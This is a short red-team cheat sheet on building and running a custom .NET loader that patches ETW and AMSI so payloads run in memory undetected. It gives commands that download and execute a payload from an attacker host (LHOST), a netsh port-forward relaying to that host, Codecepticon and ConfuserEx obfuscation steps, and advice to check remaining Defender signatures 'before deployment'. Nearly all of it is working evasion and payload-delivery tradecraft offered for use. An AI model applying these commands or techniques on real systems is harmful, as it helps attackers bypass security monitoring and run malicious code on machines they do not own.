# Custom Loader (ETW + AMSI Bypass)

A custom loader patches ETW (Event Tracing for Windows) and AMSI in the current process before executing a .NET assembly or shellcode.

## Loader Functionality (NetLoader pattern)
1. Downloads assembly via HTTP (or loads from disk)
2. Patches `EtwEventWrite` to return immediately (no events)
3. Patches `amsi.dll!AmsiScanBuffer` to always return clean
4. Loads and executes the target assembly in memory

## Usage
```
Loader.exe -path http://<LHOST>/payload.exe -args "arg1" "arg2"
# or local file
Loader.exe -path C:\Tools\payload.exe -args "arg1"
```
Port forward from machine to your HTTP server:
```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<LHOST>
Loader.exe -path http://127.0.0.1:8080/payload.exe -args "arg1"
```

## Build Custom Loader (obfuscated)
1. Start from NetLoader source: https://github.com/Flangvik/NetLoader
2. Obfuscate with Codecepticon (Markov-based rename + XOR string rewrite)
3. Compile in Visual Studio (.NET Framework console app)
4. Post-compile obfuscation with ConfuserEx 2

## Obfuscation Commands
```
Codecepticon.exe --action obfuscate --module csharp --path <solution.slnx> --rename fv --rename-method markov --string-rewrite --string-rewrite-method xor
```

## Notes
- ETW patching prevents AMSI telemetry events even when AMSI isn't directly patched
- ConfuserEx adds anti-tamper, virtualization, and control flow obfuscation
- Scan with DefenderCheck to find remaining signatures before deployment
